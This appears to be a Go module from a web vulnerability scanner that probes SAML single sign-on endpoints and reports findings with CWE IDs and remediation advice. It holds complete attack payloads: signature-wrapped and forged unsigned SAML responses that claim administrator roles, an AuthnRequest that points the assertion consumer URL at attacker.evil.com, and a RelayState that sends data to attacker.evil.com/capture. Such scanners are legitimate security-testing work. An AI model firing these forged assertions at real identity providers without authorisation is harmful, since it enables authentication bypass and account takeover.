package saml

import (
	"context"
	"encoding/base64"
	"fmt"
	"net/url"
	"strings"

	"github.com/aydocs/fang/internal/engine"
	fanghttp "github.com/aydocs/fang/internal/http"
	"github.com/aydocs/fang/pkg/models"
)

type SAMLModule struct {
	cfg    *engine.Config
	client *fanghttp.Client
}

func (m *SAMLModule) ID() string   { return "saml" }
func (m *SAMLModule) Name() string { return "SAML Security Scanner" }
func (m *SAMLModule) Description() string {
	return "SAML endpoint discovery, XML signature wrapping, SSO redirect check, response manipulation detection"
}
func (m *SAMLModule) Severity() models.Severity { return models.Critical }

func (m *SAMLModule) Init(ctx context.Context, cfg *engine.Config) error {
	m.cfg = cfg
	m.client = fanghttp.NewClient(fanghttp.WithTimeout(cfg.Timeout))
	return nil
}

func (m *SAMLModule) Scan(ctx context.Context, target *models.Target) ([]*models.Finding, error) {
	var findings []*models.Finding

	findings = append(findings, m.discoverSAMLEndpoints(ctx, target)...)
	findings = append(findings, m.checkXMLSignatureWrapping(ctx, target)...)
	findings = append(findings, m.checkSSORedirect(ctx, target)...)
	findings = append(findings, m.checkSAMLResponseManipulation(ctx, target)...)

	return findings, nil
}

func (m *SAMLModule) discoverSAMLEndpoints(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	endpoints := []string{
		"/SAML", "/saml", "/auth/saml", "/adfs/services/trust",
		"/adfs/ls", "/AuthServices", "/Shibboleth.sso",
		"/saml/sso", "/saml/login", "/saml/acs",
		"/simplesaml", "/simplesaml/module.php/core/as_login.php",
		"/sp/SAML2/Post", "/sp/SAML2/Redirect",
		"/identity/sso", "/idp/profile/SAML2/Redirect/SSO",
		"/idp/profile/SAML2/POST/SSO", "/SAML2",
		"/saml2", "/auth/saml2", "/SSoweb/login",
	}

	for _, ep := range endpoints {
		select {
		case <-ctx.Done():
			return findings
		default:
		}

		testURL := strings.TrimRight(target.URL, "/") + ep
		resp, err := m.client.Get(testURL)
		if err != nil || resp == nil {
			continue
		}

		body := strings.ToLower(resp.Body)
		status := resp.StatusCode

		if status == 200 || status == 302 || status == 303 || status == 307 {
			samlIndicators := []string{
				"saml", "samlp:response", "samlp:request", "assertion",
				"issuer", "entityid", "x509certificate",
				"md:entitydescriptor", "sp:entitydescriptor",
				"idp:entitydescriptor", "saml:assertion",
				"authnrequest", "authnresponse",
			}
			foundIndicator := ""
			for _, ind := range samlIndicators {
				if strings.Contains(body, ind) {
					foundIndicator = ind
					break
				}
			}

			if foundIndicator != "" || status == 302 {
				description := fmt.Sprintf("SAML endpoint discovered: %s (HTTP %d)", ep, status)
				remediation := "Ensure SAML endpoints require authentication. Validate SAML assertions thoroughly. Implement XML signature verification."
				cwe := "CWE-287"
				if status == 200 && foundIndicator != "" {
					description = fmt.Sprintf("SAML endpoint exposed without authentication: %s (HTTP %d, indicator: %s)", ep, status, foundIndicator)
					remediation = "Restrict access to SAML endpoints. Implement proper authentication and authorization. Use HTTPS-only for SAML communication."
				}

				findings = append(findings, &models.Finding{
					Title:       fmt.Sprintf("SAML - Endpoint Discovered: %s", ep),
					Severity:    models.High,
					Confidence:  models.MediumConfidence,
					URL:         testURL,
					Evidence:    fmt.Sprintf("HTTP %d - SAML indicator: %s", status, foundIndicator),
					Description: description,
					Remediation: remediation,
					CWEID:       cwe,
					ModuleID:    "saml",
				})
			}
		}
	}

	return findings
}

func (m *SAMLModule) checkXMLSignatureWrapping(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	stsEndpoints := []string{
		"/adfs/services/trust", "/saml/acs", "/saml/sso",
		"/SAML", "/auth/saml", "/saml2/acs",
	}

	signedWrappedXML := func(issuer string) string {
		return fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_response1" Version="2.0" IssueInstant="2024-01-01T00:00:00Z" Destination="%s">
  <saml:Issuer>%s</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_assertion1" IssueInstant="2024-01-01T00:00:00Z">
    <saml:Issuer>%s</saml:Issuer>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <ds:SignedInfo>
        <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
        <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
        <ds:Reference URI="#_original">
          <ds:Transforms>
            <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
            <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
          </ds:Transforms>
          <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
          <ds:DigestValue>INVALIDDIGEST</ds:DigestValue>
        </ds:Reference>
      </ds:SignedInfo>
      <ds:SignatureValue>INVALIDSIG</ds:SignatureValue>
      <ds:KeyInfo>
        <ds:X509Data/>
      </ds:KeyInfo>
    </ds:Signature>
    <saml:Subject>
      <saml:NameID>admin@target.com</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="2099-12-31T23:59:59Z" Recipient="%s"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="2024-01-01T00:00:00Z" NotOnOrAfter="2099-12-31T23:59:59Z">
      <saml:AudienceRestriction>
        <saml:Audience>%s</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AuthnStatement AuthnInstant="2024-01-01T00:00:00Z" SessionIndex="_session1">
      <saml:AuthnContext>
        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef>
      </saml:AuthnContext>
    </saml:AuthnStatement>
    <saml:AttributeStatement>
      <saml:Attribute Name="Role">
        <saml:AttributeValue>Administrator</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
  <saml:Assertion ID="_original" IssueInstant="2024-01-01T00:00:00Z">
    <saml:Issuer>%s</saml:Issuer>
    <saml:Subject>
      <saml:NameID>user@target.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>`, target.URL, issuer, issuer, target.URL, target.URL, issuer)
	}

	for _, ep := range stsEndpoints {
		select {
		case <-ctx.Done():
			return findings
		default:
		}

		postURL := strings.TrimRight(target.URL, "/") + ep
		issuer := extractIssuer(target.URL)
		xmlPayload := signedWrappedXML(issuer)
		encodedXML := base64.StdEncoding.EncodeToString([]byte(xmlPayload))

		body := url.Values{}
		body.Set("SAMLResponse", encodedXML)

		resp, err := m.client.Post(postURL, body.Encode())
		if err != nil || resp == nil {
			continue
		}

		bodyLower := strings.ToLower(resp.Body)
		status := resp.StatusCode

		wrappingIndicators := []string{
			"assertion", "authenticated", "session",
			"token", "login successful", "welcome",
			"redirect", "location",
		}

		errorIndicators := []string{
			"invalid signature", "signature validation failed",
			"malformed", "invalid assertion",
			"bad request", "forbidden",
			"unauthorized", "parse error",
		}

		hasWrapping := false
		foundEv := ""

		for _, ind := range wrappingIndicators {
			if strings.Contains(bodyLower, ind) {
				hasWrapping = true
				foundEv = ind
				break
			}
		}

		isError := false
		for _, ind := range errorIndicators {
			if strings.Contains(bodyLower, ind) {
				isError = true
				foundEv = ind
				break
			}
		}

		if status == 200 && hasWrapping && !isError {
			findings = append(findings, &models.Finding{
				Title:       "SAML - XML Signature Wrapping Bypass",
				Severity:    models.Critical,
				Confidence:  models.MediumConfidence,
				URL:         postURL,
				Payload:     base64.StdEncoding.EncodeToString([]byte("SAMLResponse with wrapped invalid assertion external to signed block")),
				Evidence:    fmt.Sprintf("HTTP %d - Application processed wrapped SAML response (indicator: %s)", status, foundEv),
				Description: "SAML XML signature wrapping attack possible. The service accepted a SAML response where the signed Assertion contained an invalid digest, but a second unsigned Assertion with privileged attributes was processed. This bypasses signature validation entirely.",
				Remediation: "Validate that the signature covers the entire Assertion element used for authorization. Use enveloped reference validation. Implement position-based assertion verification. Apply SAML SSO profile strict checking.",
				CWEID:       "CWE-345",
				ModuleID:    "saml",
			})
		} else if status == 200 && !isError {
			findings = append(findings, &models.Finding{
				Title:       "SAML - Signature Wrapping Test: Non-Standard Response",
				Severity:    models.Medium,
				Confidence:  models.LowConfidence,
				URL:         postURL,
				Payload:     "Wrapped SAML Assertion with external unsigned assertion carrying privileged attributes",
				Evidence:    fmt.Sprintf("HTTP %d - No error returned for wrapped SAML response", status),
				Description: "The SAML endpoint did not reject a manipulated assertion with invalid signature. Further testing required to confirm signature wrapping bypass.",
				Remediation: "Ensure XML signature covers the entire Assertion element. Validate that the assertion used for authorization is the signed one.",
				CWEID:       "CWE-345",
				ModuleID:    "saml",
			})
		}
	}

	return findings
}

func (m *SAMLModule) checkSSORedirect(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	redirectEndpoints := []string{
		"/SAML?SAMLRequest=", "/saml?SAMLRequest=",
		"/auth/saml?SAMLRequest=", "/adfs/ls/?SAMLRequest=",
	}

	for _, ep := range redirectEndpoints {
		select {
		case <-ctx.Done():
			return findings
		default:
		}

		fakeRequest := base64.StdEncoding.EncodeToString([]byte(
			`<?xml version="1.0"?>
<samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_fake" Version="2.0" IssueInstant="2024-01-01T00:00:00Z" Destination="` + target.URL + `" AssertionConsumerServiceURL="https://attacker.evil.com/saml/acs" ProtocolBinding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST">
  <saml:Issuer>https://attacker.evil.com</saml:Issuer>
</samlp:AuthnRequest>`))

		testURL := strings.TrimRight(target.URL, "/") + ep + url.QueryEscape(fakeRequest)
		resp, err := m.client.Get(testURL)
		if err != nil || resp == nil {
			continue
		}

		status := resp.StatusCode
		bodyLower := strings.ToLower(resp.Body)
		location := resp.Redirect

		if status >= 300 && status < 400 && location != "" {
			locLower := strings.ToLower(location)
			containsEvil := strings.Contains(locLower, "attacker.evil.com") || strings.Contains(locLower, "evil.com")

			if containsEvil || strings.Contains(locLower, "samlresponse") || strings.Contains(locLower, "assertion") {
				findings = append(findings, &models.Finding{
					Title:       "SAML - SSO Redirect Manipulation",
					Severity:    models.Critical,
					Confidence:  models.HighConfidence,
					URL:         testURL,
					Payload:     fakeRequest,
					Evidence:    fmt.Sprintf("Redirect to %s from SAML endpoint %s", location, ep),
					Description: "SAML SSO endpoint redirects the user based on unsanitized SAMLRequest parameter. An attacker can craft a request that redirects to a malicious AssertionConsumerServiceURL, enabling credential theft via phishing.",
					Remediation: "Whitelist allowed ACS URLs. Validate RelayState and AssertionConsumerServiceURL against a pre-configured list. Sign AuthnRequests to prevent tampering.",
					CWEID:       "CWE-287",
					ModuleID:    "saml",
				})
			}
		}

		if status == 200 {
			redirectIndicators := []string{
				"samlresponse", "assertionconsumerserviceurl",
				"action url", "saml:attribute", "saml:assertion",
			}
			for _, ind := range redirectIndicators {
				if strings.Contains(bodyLower, ind) {
					findings = append(findings, &models.Finding{
						Title:       "SAML - SSO Endpoint Returns SAML Data",
						Severity:    models.High,
						Confidence:  models.MediumConfidence,
						URL:         testURL,
						Payload:     fakeRequest,
						Evidence:    fmt.Sprintf("HTTP 200 with SAML content: %s", ind),
						Description: "SAML SSO endpoint returned sensitive SAML assertion data without proper validation. This could leak authentication tokens or allow response manipulation.",
						Remediation: "Validate AuthnRequest signatures. Implement proper SSO redirect validation. Ensure SAML responses are signed and encrypted in transit.",
						CWEID:       "CWE-200",
						ModuleID:    "saml",
					})
					break
				}
			}
		}
	}

	return findings
}

func (m *SAMLModule) checkSAMLResponseManipulation(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	endpoints := []string{"/saml/acs", "/SAML/acs", "/auth/saml/acs", "/adfs/ls"}

	manipulationPayloads := []struct {
		name    string
		xmlBody string
	}{
		{
			name: "Privilege Escalation via Role Attribute Injection",
			xmlBody: func() string {
				issuer := extractIssuer(target.URL)
				return fmt.Sprintf(`<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_resp2" InResponseTo="_fake" Version="2.0" IssueInstant="2024-01-01T00:00:00Z" Destination="%s">
  <saml:Issuer>%s</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion ID="_assertion_priv" IssueInstant="2024-01-01T00:00:00Z">
    <saml:Issuer>%s</saml:Issuer>
    <saml:Subject>
      <saml:NameID>admin@target.com</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="2099-12-31T23:59:59Z" Recipient="%s"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="2024-01-01T00:00:00Z" NotOnOrAfter="2099-12-31T23:59:59Z">
      <saml:AudienceRestriction>
        <saml:Audience>%s</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AuthnStatement AuthnInstant="2024-01-01T00:00:00Z"/>
    <saml:AttributeStatement>
      <saml:Attribute Name="http://schemas.microsoft.com/ws/2008/06/identity/claims/role">
        <saml:AttributeValue>GlobalAdministrator</saml:AttributeValue>
        <saml:AttributeValue>DomainAdmin</saml:AttributeValue>
        <saml:AttributeValue>EnterpriseAdmin</saml:AttributeValue>
      </saml:Attribute>
      <saml:Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress">
        <saml:AttributeValue>admin@target.com</saml:AttributeValue>
      </saml:Attribute>
      <saml:Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name">
        <saml:AttributeValue>Administrator</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>`, target.URL, issuer, issuer, target.URL, target.URL)
			}(),
		},
		{
			name: "Session Manipulation via InResponseTo Removal",
			xmlBody: func() string {
				issuer := extractIssuer(target.URL)
				return fmt.Sprintf(`<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_resp3" Version="2.0" IssueInstant="2024-01-01T00:00:00Z" Destination="%s">
  <saml:Issuer>%s</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion ID="_assertion_session" IssueInstant="2024-01-01T00:00:00Z">
    <saml:Issuer>%s</saml:Issuer>
    <saml:Subject>
      <saml:NameID>user@target.com</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="2099-12-31T23:59:59Z" Recipient="%s"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="2024-01-01T00:00:00Z" NotOnOrAfter="2099-12-31T23:59:59Z">
      <saml:AudienceRestriction>
        <saml:Audience>%s</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AuthnStatement AuthnInstant="2024-01-01T00:00:00Z" SessionIndex="_injected_session"/>
  </saml:Assertion>
</samlp:Response>`, target.URL, issuer, issuer, target.URL, target.URL)
			}(),
		},
	}

	for _, ep := range endpoints {
		for _, p := range manipulationPayloads {
			select {
			case <-ctx.Done():
				return findings
			default:
			}

			postURL := strings.TrimRight(target.URL, "/") + ep
			encodedXML := base64.StdEncoding.EncodeToString([]byte(p.xmlBody))
			formData := url.Values{}
			formData.Set("SAMLResponse", encodedXML)
			formData.Set("RelayState", "https://attacker.evil.com/capture")

			resp, err := m.client.Post(postURL, formData.Encode())
			if err != nil || resp == nil {
				continue
			}

			bodyLower := strings.ToLower(resp.Body)
			status := resp.StatusCode

			successIndicators := []string{
				"authenticated", "welcome", "dashboard",
				"session created", "logged in", "token",
				"set-cookie", "authorized",
			}

			failIndicators := []string{
				"invalid response", "signature validation failed",
				"mismatch", "inresponseto", "invalid assertion",
				"response not recognized",
			}

			accepted := false
			evidence := ""
			for _, ind := range successIndicators {
				if strings.Contains(bodyLower, ind) {
					accepted = true
					evidence = ind
					break
				}
			}

			if !accepted && status < 400 {
				for _, ind := range failIndicators {
					if strings.Contains(bodyLower, ind) {
						evidence = ind
						break
					}
				}
			}

			if accepted || (status == 200 && evidence != "") {
				severity := models.Critical
				if !accepted {
					severity = models.Medium
				}

				findings = append(findings, &models.Finding{
					Title:       fmt.Sprintf("SAML - Response Manipulation: %s", p.name),
					Severity:    severity,
					Confidence:  models.MediumConfidence,
					URL:         postURL,
					Payload:     encodedXML,
					Evidence:    fmt.Sprintf("HTTP %d - Indicator: %s", status, evidence),
					Description: fmt.Sprintf("SAML response manipulation attempt via %s. The SAML endpoint may be processing unsolicited or modified responses without proper validation.", p.name),
					Remediation: "Validate InResponseTo for all SAML responses. Verify Response and Assertion signatures. Use unique, unpredictable Assertion IDs. Bind sessions to specific AuthnRequests.",
					CWEID:       "CWE-345",
					ModuleID:    "saml",
				})
			}
		}
	}

	return findings
}

func extractIssuer(rawURL string) string {
	u, err := url.Parse(rawURL)
	if err != nil {
		return rawURL
	}
	scheme := u.Scheme
	if scheme == "" {
		scheme = "https"
	}
	return fmt.Sprintf("%s://%s", scheme, u.Host)
}

func init() {
	engine.GetRegistry().Register(&SAMLModule{})
}
